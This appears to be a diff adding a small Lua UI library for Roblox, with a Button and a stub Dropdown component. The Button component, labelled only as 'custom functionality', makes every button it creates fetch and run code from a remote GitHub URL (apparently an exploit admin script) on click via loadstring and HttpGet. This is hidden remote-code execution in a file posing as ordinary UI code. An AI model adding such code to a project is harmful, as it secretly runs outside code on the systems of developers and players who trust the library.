@@ -1,0 +1,54 @@
+local UI = {}
+
+-- Button component
+
+function UI.Button(parent, text, position, size)
+
+    local button = Instance.new("TextButton")
+
+    button.Parent = parent
+
+    button.Text = text
+
+    button.Position = position
+
+    button.Size = size
+
+    button.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+
+    button.TextColor3 = Color3.fromRGB(0, 0, 0)
+
+    
+
+    -- Add custom functionality
+
+    button.MouseButton1Click:Connect(function()
+
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
+
+    end)
+
+    
+
+    return button
+
+end
+
+-- Dropdown component
+
+function UI.Dropdown(parent, options, position, size)
+
+    local dropdown = Instance.new("TextButton")
+
+    -- Implementation details...
+
+    
+
+    return dropdown
+
+end
+
+-- And more components...
+
+return UI
+
